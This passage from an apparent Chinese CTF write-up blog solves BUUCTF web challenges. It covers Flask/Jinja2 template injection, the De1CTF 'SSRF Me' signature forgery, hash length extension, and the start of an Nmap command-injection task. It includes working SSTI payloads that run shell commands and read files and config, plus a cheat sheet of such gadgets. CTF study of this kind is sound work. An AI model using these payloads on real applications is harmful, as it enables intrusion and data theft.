<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">/shrine/</span><span class="template-variable">&#123;&#123;<span class="name">url_for.__globals__</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure>

![image-20220517135347205](./buu/image-20220517135347205.png)

current_app': <Flask 'app'>这里的current就是指的当前的app，这样我们只需要能查看到这个的config不就可以看到flag了，那么构造payload

<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">/shrine/</span><span class="template-variable">&#123;&#123;<span class="name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span></span><br></pre></td></tr></table></figure>

![image-20220517135528260](./buu/image-20220517135528260.png)

[ssti总结](https://blog.csdn.net/Manuffer/article/details/120739989)

类的知识总结

<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">__class__</span>            类的一个内置属性，表示实例对象的类。</span><br><span class="line"><span class="variable">__base__</span>             类型对象的直接基类</span><br><span class="line"><span class="variable">__bases__</span>            类型对象的全部基类，以元组形式，类型的实例通常没有属性 <span class="variable">__bases__</span></span><br><span class="line"><span class="variable">__mro__</span>              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line"><span class="variable">__subclasses__</span>()     返回这个类的子类集合，Each class keeps a <span class="built_in">list</span> of weak references <span class="keyword">to</span> its immediate subclasses. This method returns a <span class="built_in">list</span> of all those references still <span class="built_in">alive</span>. The <span class="built_in">list</span> is <span class="built_in">in</span> definition order.</span><br><span class="line"><span class="variable">__init__</span>             初始化类，返回的类型是function</span><br><span class="line"><span class="variable">__globals__</span>          使用方式是 函数名.<span class="variable">__globals__</span>获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line"><span class="variable">__dic__</span>              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的<span class="variable">__dict__</span>里</span><br><span class="line"><span class="variable">__getattribute__</span>()   实例、类、函数都具有的<span class="variable">__getattribute__</span>魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用<span class="variable">__getattribute__</span>方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line"><span class="variable">__getitem__</span>()        调用字典中的键值，其实就是调用这个魔术方法，比如a[<span class="string">&#x27;b&#x27;</span>]，就是a.<span class="variable">__getitem__</span>(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"><span class="variable">__builtins__</span>         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。<span class="variable">__builtins__</span>与<span class="variable">__builtin__</span>的区别就不放了，百度都有。</span><br><span class="line"><span class="variable">__import__</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="variable">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()]</span><br><span class="line"><span class="variable">__str__</span>()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到<span class="variable">__builtins__</span>，而且url_for.<span class="variable">__globals__</span>[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到<span class="variable">__builtins__</span>，而且url_for.<span class="variable">__globals__</span>[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到<span class="variable">__builtins__</span>，而且lipsum.<span class="variable">__globals__</span>含有os模块：&#123;&#123;lipsum.<span class="variable">__globals__</span>[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.<span class="variable">__init__</span>.<span class="variable">__globals__</span>[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;/proc\self\fd/3&#x27;</span>).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-<span class="built_in">Type</span>:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-<span class="built_in">Type</span>:a/b)</span><br><span class="line">request.json		 post传json  (Content-<span class="built_in">Type</span>: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.<span class="variable">__class__</span>.<span class="variable">__init__</span>.<span class="variable">__globals__</span>[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of <span class="string">&#x27;flask_ssti&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">ls来查看一下有哪些文件：/?<span class="built_in">flag</span>=&#123;&#123;config.<span class="variable">__class__</span>.<span class="variable">__init__</span>.<span class="variable">__globals__</span>[%<span class="number">27</span>os%<span class="number">27</span>].popen(%<span class="number">27</span>ls%<span class="number">27</span>).read()&#125;&#125;</span><br><span class="line">/?<span class="built_in">flag</span>=&#123;&#123;config.<span class="variable">__class__</span>.<span class="variable">__init__</span>.<span class="variable">__globals__</span>[%<span class="number">27</span>os%<span class="number">27</span>].popen(%<span class="number">27</span>cat%<span class="number">20</span><span class="built_in">flag</span>%<span class="number">27</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

常见过滤器

<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">常用的过滤器</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">int</span><span class="params">()</span>：将值转换为<span class="title">int</span>类型；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">float</span><span class="params">()</span>：将值转换为<span class="title">float</span>类型；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">lower</span><span class="params">()</span>：将字符串转换为小写；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">upper</span><span class="params">()</span>：将字符串转换为大写；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">title</span><span class="params">()</span>：把值中的每个单词的首字母都转成大写；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">capitalize</span><span class="params">()</span>：把变量值的首字母转成大写，其余字母转小写；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">trim</span><span class="params">()</span>：截取字符串前面和后面的空白字符；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">wordcount</span><span class="params">()</span>：计算一个长字符串中单词的个数；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">reverse</span><span class="params">()</span>：字符串反转；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">replace</span><span class="params">(value,old,new)</span>： 替换将<span class="title">old</span>替换为<span class="title">new</span>的字符串；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">truncate</span><span class="params">(value,length=<span class="number">255</span>,killwords=False)</span>：截取<span class="title">length</span>长度的字符串；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">striptags</span><span class="params">()</span>：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">escape</span><span class="params">()</span>或<span class="title">e</span>：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：<span class="title">content</span>|<span class="title">escape</span>或<span class="title">content</span>|<span class="title">e</span>。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">safe</span><span class="params">()</span>： 禁用HTML转义，如果开启了全局转义，那么<span class="title">safe</span>过滤器会将变量关掉转义。示例： &#123;&#123;<span class="title">&#x27;</span>&lt;<span class="title">em</span>&gt;<span class="title">hello</span>&lt;/<span class="title">em</span>&gt;<span class="title">&#x27;</span>|<span class="title">safe</span>&#125;&#125;；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">list</span><span class="params">()</span>：将变量列成列表；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">string</span><span class="params">()</span>：将变量转换成字符串；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">join</span><span class="params">()</span>：将一个序列中的参数值拼接成字符串。示例看上面<span class="title">payload</span>；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">abs</span><span class="params">()</span>：返回一个数值的绝对值；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">first</span><span class="params">()</span>：返回一个序列的第一个元素；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">last</span><span class="params">()</span>：返回一个序列的最后一个元素；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">format</span><span class="params">(value,arags,*kwargs)</span>：格式化字符串。比如：&#123;&#123; &quot;%<span class="title">s</span>&quot; - &quot;%<span class="title">s</span>&quot;|<span class="title">format</span><span class="params">(&#x27;Hello?&#x27;,<span class="string">&quot;Foo!&quot;</span>)</span> &#125;&#125;将输出：H<span class="title">elloo</span>? - F<span class="title">oo</span>!</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">length</span><span class="params">()</span>：返回一个序列或者字典的长度；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">sum</span><span class="params">()</span>：返回列表内数值的和；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">sort</span><span class="params">()</span>：返回排序后的列表；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">default</span><span class="params">(value,default_value,boolean=false)</span>：如果当前变量没有值，则会使用参数中的值来代替。示例：<span class="title">name</span>|<span class="title">default</span><span class="params">(&#x27;xiaotuo&#x27;)</span>----如果<span class="title">name</span>不存在，则会使用<span class="title">xiaotuo</span>来替代。<span class="title">boolean</span>=F<span class="title">alse</span>默认是在只有这个变量为<span class="title">undefined</span>的时候才会使用<span class="title">default</span>中的值，如果想使用<span class="title">python</span>的形式判断是否为<span class="title">false</span>，则可以传递<span class="title">boolean</span>=<span class="title">true</span>。也可以使用<span class="title">or</span>来替换。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">length</span><span class="params">()</span>返回字符串的长度，别名是<span class="title">count</span></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

## [De1CTF 2019]SSRF Me

![image-20220517145145288](./buu/image-20220517145145288.png)

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># #encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span> <span class="comment">#初始化类，返回的类型是function</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">not</span> os.path.exists(self.sandbox)):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># SandBox For Remote_Addr os.mkdir(self.sandbox)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">                <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line">            <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="comment">#GET方式接受 param参数值</span></span><br><span class="line"><span class="comment">#令action = &quot;scan&quot;</span></span><br><span class="line"><span class="comment">#同时将action和param，返回到 getSign()函数  生成一段签名</span></span><br><span class="line"><span class="comment">#urllib.unquote()字符串被当作url提交时会被自动进行url编码处理</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> (waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="comment">#以GET方法接受 接受 param 参数</span></span><br><span class="line"><span class="comment">#cookie接收 sign 和 action</span></span><br><span class="line"><span class="comment">#使用 waf函数进行判断 我们传入的参数中是否含有 gopher 和 file 着两个敏感词汇</span></span><br><span class="line"><span class="comment">#将action, param, sign, ip 四个参数转到tast函数中，</span></span><br><span class="line"><span class="comment">#将我们在tast.Exec()转变为 json的格式，</span></span><br><span class="line"><span class="comment">#从而实现我们进行读取的目的</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##tast函数中，先初始化类  之后进行一个签名的判断</span></span><br><span class="line"><span class="comment">#调用getSign()函数 与我们输入的签名进行对比</span></span><br><span class="line"><span class="comment">#相同，继续进行判断</span></span><br><span class="line"><span class="comment">#若&quot;scan&quot; in self.action:则将读取到的内容写入result.txt;</span></span><br><span class="line"><span class="comment">#若&quot;read&quot; in self.action:则将result.txt的内容显示出来</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)  <span class="comment">#从url上下载图片</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span>   <span class="comment"># 获得签名  函数</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="comment">#对secert_key + param + action进行MD5加密，同时利用hexdigest() 函数将加密后的MD5字符串转化为十六进制数据字符串值    #获得的字符串就是 cookie需要的Sign</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span><span class="comment">#判断我们传入的文件是否含有以gopher或者file开头 </span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

payload：
本关的是要签名的判断
我们可以利用前面 route"/geneSign"来生成我们需要的sign
同时我们要让cookie中含有 scan 和 read 以便后续对flag的文件进行读取
scan的话，在geneSign函数里面,action是等于scan，而getsign函数将param和action拼接起来，所以我们无需将scan加入到我们所需要查询文件的后面，仅仅只需要将read添加到后面即可

同时，本题提示我们flag is in ./flag.txt

创建 sign

`/geneSign?param=flag.txtread`![image-20220517151052378](./buu/image-20220517151052378.png)

访问 flag文件

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/De1ta?param=flag.txt</span><br><span class="line"></span><br><span class="line">Cookie:action=readscan;sign=fa25db02c88ac47093e53f1114a81475</span><br></pre></td></tr></table></figure>

![image-20220517151729782](./buu/image-20220517151729782.png)

## [哈希长度拓展攻击]([Hash Length Extension Attack](https://joychou.org/web/hash-length-extension-attack.html#directory092413593576057416))

利用的话就是利用hashpump工具：
 [HashPump](https://github.com/bwall/HashPump)

## [网鼎杯 2020 朱雀组]Nmap

![image-20220517154855716](./buu/image-20220517154855716.png)

nmap这款工具是用来扫描网络的，一般会拿来扫目标主机的端口或操作系统之类的，之前有用过，他有很多的命令可以使用，但之前没有刻意去研究。

估计这题的后台就是用了一条简单的拼接语句，类似于："nmap".$cmd，之类的。

先抓个包看一下运行流程，首先index.php用了POST传参传过去一个host参数，然后本地又发起了一个GET请求，传了一个参数f=90131，通过修改此参数，发现PHP报错 simplexml_load_file(): I/O warning : failed to load external entity  "xml/90132" in **/var/www/html/result.php** on line **23**

![image-20220517155315696](./buu/image-20220517155315696.png)

![image-20220517155747902](./buu/image-20220517155747902.png)

simplexml_load_file() 函数是把 XML 文档载入对象中，所以初步猜想，应该是nmap将扫描的结果保存为了xml文档，然后PHP再打开该文档解析，后台命令可能为nmap -oX 127.0.0.1 ./xml/????

这里就需要稍微了解一下nmap的指令了，稍微在网上收集了一些常用命令，以便后面查阅：

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">nmap</span> -v <span class="number">127.0</span>.<span class="number">0.1</span>							给出了远程机器更详细的信息，显示冗余信息(扫描细节)</span><br><span class="line"><span class="keyword">nmap</span> -iL nmaptest.txt 						运行带“iL” 选项的<span class="keyword">nmap</span>命令来扫描文件中列出的所有IP地址</span><br><span class="line"><span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0</span>.* --exclude <span class="number">192.168</span>.<span class="number">0.100</span>	使用“-exclude”选项来排除某些你不想要扫描的主机</span><br><span class="line"><span class="keyword">nmap</span> -A <span class="number">192.168</span>.<span class="number">0.101</span>						启用操作系统和版本检测，脚本扫描和路由跟踪功能</span><br><span class="line"><span class="keyword">nmap</span> -O <span class="number">127.0</span>.<span class="number">0.1</span>							使用选项“-O”和“-osscan-guess”也帮助探测操作系统信息</span><br><span class="line"><span class="keyword">nmap</span> -sA <span class="number">192.168</span>.<span class="number">0.101</span>						扫描远程主机以探测该主机是否使用了包过滤器或防火墙</span><br><span class="line"><span class="keyword">nmap</span> -PN <span class="number">192.168</span>.<span class="number">0.101</span>						扫描主机检测其是否受到数据包过滤软件或防火墙的保护</span><br><span class="line"><span class="keyword">nmap</span> -sP <span class="number">192.168</span>.<span class="number">0</span>.*						找出网络中的在线主机</span><br><span class="line"><span class="keyword">nmap</span> -F <span class="number">192.168</span>.<span class="number">0.101</span>						快速扫描，仅扫描<span class="keyword">nmap</span>-services文件中的端口而避开所有其它的端口</span><br><span class="line"><span class="keyword">nmap</span> -<span class="keyword">f</span> <span class="number">192.168</span>.<span class="number">96.4</span>						使用小数据包发送，避免被识别出</span><br><span class="line"><span class="keyword">nmap</span> -r <span class="number">192.168</span>.<span class="number">0.101</span>						不会随机的选择端口扫描</span><br><span class="line"><span class="keyword">nmap</span> -<span class="keyword">p</span> <span class="number">80</span>,<span class="number">443</span> <span class="number">192.168</span>.<span class="number">0.101</span>				使用“-<span class="keyword">P</span>”选项指定你想要扫描的端口</span><br><span class="line"><span class="keyword">nmap</span> -sV <span class="number">192.168</span>.<span 